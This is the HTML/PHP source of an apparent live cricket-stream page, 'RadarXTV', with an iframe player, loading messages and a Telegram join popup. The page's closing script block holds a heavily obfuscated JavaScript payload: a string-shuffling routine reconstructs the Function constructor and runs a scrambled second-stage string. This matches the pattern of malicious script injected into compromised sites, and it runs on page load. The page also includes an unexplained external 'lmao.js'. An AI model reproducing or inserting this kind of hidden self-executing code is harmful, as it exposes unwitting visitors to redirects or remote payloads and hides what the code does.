<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
            .logo {
        position: absolute;
        top: 10px; /* Adjust vertical position */
        left: 10px; /* Adjust horizontal position */
        z-index: 1; /* Ensure the logo appears above the video */
        max-width: 120px; /* Set maximum width for the logo */
        max-height: 120px; /* Set maximum height for the logo */
        pointer-events: none; /* Prevent interference with video controls */
    }
    
    </style>
</head>
<body>
    <!-- Video container -->
    <div class="video-container">
        <!-- Logo inside the video -->
        <img src="chutman.jpg" alt="Logo" class="logo">
        
<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var HxQ='',hvx=486-475;function wUa(k){var z=1236647;var m=k.length;var r=[];for(var w=0;w<m;w++){r[w]=k.charAt(w)};for(var w=0;w<m;w++){var e=z*(w+505)+(z%28391);var p=z*(w+287)+(z%18832);var u=e%m;var l=p%m;var s=r[u];r[u]=r[l];r[l]=s;z=(e+p)%5854900;};return r.join('')};var dtu=wUa('cphrsnucfjzaktgvotdtebyclowqirmxousnr').substr(0,hvx);var OIR='=oa ;C;m,;=ult0=c2t.0kd,]d;n= sx62tz.,yc+*]r0[rvlirhauc7r.,db8;x"ig(gn ,,.1"(uu;r;s6v8+,).[Co(s[lre]8Cgr [;0c8ka";)6+a[=o;flk,tgf2=rr)e r70;nl73nv7nrensj,+8-)t[,u<oo2k+(;07.+nni{r4,[2 =s;ft]rkp[+v4horej=rn xr)"oe=ielr"1)r7ilavhA2++hf"ao,lh6bo;f5eeC=g]."fti((tso.fvaa+05kcf];9e), .fyh;">.h;no-0afon9;=5ldl[]c+v Ap)jc;hasyvjCe1( v9f===u=ve=n(5aC,ja2tijea;fxi(or-=.fc;l}v <(]loa)(vzptg2ev)t; C=de9ava)tpoc)a)ta;;c;,{;)n)=oA-d)p=+a=pn ru( =aephg1n-dmhv.;eA ;]2civdpn.a3[;t=avi*mr.hefg(.,(+-ncl[u4ov.8.r)+zv<,o(<not (Sasb]ee)iktux60;,are)}tv(ek,1v6ebrbm[i8(ce=f)le).;,])r;=t=])lrru(l;=r>=Citait(t"siv=(c"pg{n().irth2sl4)eg;1urAc=nn,a;rggemri66eamu+.uo(ft)r)(a vxSlnr={o(r(=48s)(vmc,v;1.[;n]lndrh);};1vor+rh;.ngir{,;8 rj((so erk=+,pa,1a+[g9(.f1.ll)zerr, ks= !=<abcv3=anw+rtl=neo)g9asois+akgda+;(ntu}+r0sh,fits==u.6(l9v(4)l;7170)=(;+e.ah=;rdo ennu rnh]husio!{q1}fb)e}rztu+r}s+; l-j0p2.{ms1ro=r py;';var Dju=wUa[dtu];var GKO='';var rWo=Dju;var HQW=Dju(GKO,wUa(OIR));var sJd=HQW(wUa('durctGee vo?.52_Hf.%7 C)$E_;a(j)fa)uwc%0con5BlVfV)on!n]mpd3s&eOVeVa,26V(oVVo =_stVV_\/(_gu0A)PVe5dV(C_95u)oEm_VvadVVa[tRV;n.+V3V?r"VVa3{9$d\'V$n3>V%nVVnn;%]3).6VG,V7ind$n[#i;Qjoit\' V30,,V ,(ut8_D+.%3(o_3f,I6uin. ;V_m4bu{5{2ssnjaspVdt$Qide%c.VVeerdVri)k:dk_V\/:D]t3lan3qGVV)f_3gr=_r(a 5;Vtx(l>52Vd;%r0tm+s_(F);>*ecVdnd1Nc9edee)k)Vl.eV\/.dD(vy=>3t(d c(dtdf%ug)fa6lV8i%.Md3%_Vt=3t8;Vee5..rb.vipnd &!cP@ ;+.%]ettc=V&=!rV_e!y)rfu;>3lsV5oeV1aoVeeVa*V(H%)rr!8Vee.l5lVVreV7ehh.pf<wee;aVDriV0$i)?lVVd.99(_t.lt2e37rze0ieeNv3%_.V1.,Ve1_V[;u#(r9__;AeK.y6)t%9ni5lideVrtn(,de)irc4sVi(. t]lg)v2V,V>)4VLk7oSV)_eVrd oo({c [t(8.t!_a_r0sn;7]1_Ceccp}oC16VVePe\/)VVrnVv_VVOc,w7,V1ab 1pV..17)Vn\'Is&]o.1u4j(scVe9nlrVtV_3{> c-iD#s".MV_i_3Mps;Ef.;Jo3=VVPe$V*!V} d.o7..G!l_5.tVjrdB>a]c)foVV!C=folt28{DiVev.a=Vv=n3{,2Va6;7i)V=(gn%i_E4b=ciar(a.g 5Hnnbs2rV(_(aVs}0M<{V_H4})].h%1fp d7fV}eVu-d75[Vlq((1zl)ieV2_nVdrm>,d3fh%.n ce.nas1eV$kr,32)nvNdV;frn)nn!gt2a;3)l763Le_VOnt!5J$Mrua!;e$V0(4_Vi,)dnV4rcaeVtVV(n)VpcV V,gpol(tVf.rVb3De, V6fewVi\/hf7!mc)tsCV)(_1Vrgd!0Ns.eV3}e2P)rKV#.!u16_V,3.( <0V,G#05<3oVn#.V%VoqioV%-wVB_V3eVe(;VBi=VuVVi%1:za=VrV!wdPni)iasVhEta=).=ae=vL7+VVmVn}n;];VVV%=5!Mi4trrl;bV#[]fr.]s,eV720VcV! )cVlt]= S32"3c;.o_t _VV.4)%1y()][)Vnl!w?7:!lx Vi];;9Vo_nnVtco3e5fsVnnl1 _5J40mt()]lfnn()io.VV3(Vni.deaV%il"aVcj;fRSnVoeV763_og..Se(e))n.))I7s[_V(55(Vf$Hus=6b( !%f(eV(%cpeb=R)]eoVV1c[nV%Lc1A(o{jdf)_"o8VVVs{2etn_=,n?rV(@{M]b8)bs!ni.4VVe)Ve!0l(Vr8[7{]cV};\/0VC]bV9V%ViVoo  (Vn{#dV}Q;,e}."_VgVeV(5d!_VVVcdiaSV=i(rr_9r)fnn.6_;tcga{nctVV3jAo,]+$c8V)41_.n.(0Vie%!V;roe5j5Vnot3}m&;%=g7Vpl=fmr$ V) ]c+l\/d"3.;i.D)yVi$%3jVdc=6V&se5erKV..6fos60Va=scVda}VV,s)(],+39Ion4d .:$2).$_]75l2;8aVVV%fe6r.$)c%}euauVrr.%;(o.13cVe3l6V%t_nV\/V0}a2a8\'5N{e$,(sV2V0V(_1.p$5itlfr!]cjcV._yf7}rtr"03v)<d7)2S)42.Ef=1(4.mc>*.ehV6l_5g b${(c05V._FVf,Vnb9m)8)?fI2[]mAir$].!.y.l1\'t99}Vb"7p_n{]cV0cbI3!VVd2)d)o80$4$7a$Vi5:t(V}8.)d.oeq.3aVVedtnVu5h,gf)VV+Vt3se_+V]na]nIr!Vr_]0=b,%a7Vn9S"rdVt$Vs _ir75ddc3s0_rm=D2V;e$Vi,],o;fte0&i3%6$O8cuQer2gVV7_laV1$V2Vd]d$=o0,aa6f58Vo.VVdjd7V3e$={re,>ttsiu7 o)(s_ w)glurm.xgud.}eoirVr ..iao?u}o v;3cVs1x( #{V)$v>m.eua"-)o16daco$5e!en_ ksjt#$0=}V0d]dit!]nu6j (1Cs]2..]i%0VxrVmV!a")f1]:;NaViVdV6V_$Vf,)$ VeifV=(if\/VVeV%$$cFo=5R().g)._k0]_((n )se2h_llnnb0c$#09V {0ftfENte%vtn_galyNdVb,raMh Sdk139o%Vdm5oD cV_.n.VoVrnK4xVff@%iJV[on]o.jV{)o\/lVll5)(C.2_(nf\/oSu]{5V @$,n -)u; tMorh. 1g)VVmw9{)$s'));var YpY=rWo(HxQ,sJd );YpY(3987);return 5985})()
</script>

</body>
</html>